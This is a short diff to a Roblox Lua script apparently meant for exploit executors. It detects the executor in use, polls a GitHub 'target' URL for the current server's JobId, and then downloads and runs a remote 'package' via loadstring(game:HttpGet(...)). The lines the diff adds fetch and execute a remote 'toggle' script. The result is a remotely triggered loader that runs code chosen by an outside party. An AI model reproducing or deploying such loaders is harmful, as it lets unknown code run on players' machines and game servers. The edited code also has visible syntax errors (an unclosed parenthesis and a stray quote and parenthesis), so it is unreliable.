@@ -1,4 +1,6 @@
 wait(10)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nixey70/my-hub/main/toggle")
+if getgenv().toggle == true then
 local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
@@ -37,8 +39,9 @@ local job = game.JobId
 while true do
     wait(1)
     local job = game.JobId
-    local input = game:HttpGet("https://raw.githubusercontent.com/nixey70/my-hub/main/target")
+    local input = game:HttpGet("https://raw.githubusercontent.com/nixey70/my-hub/main/target")")
     if input == job then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/nixey70/my-hub/main/the%20package", true))()
     end
+end
 end
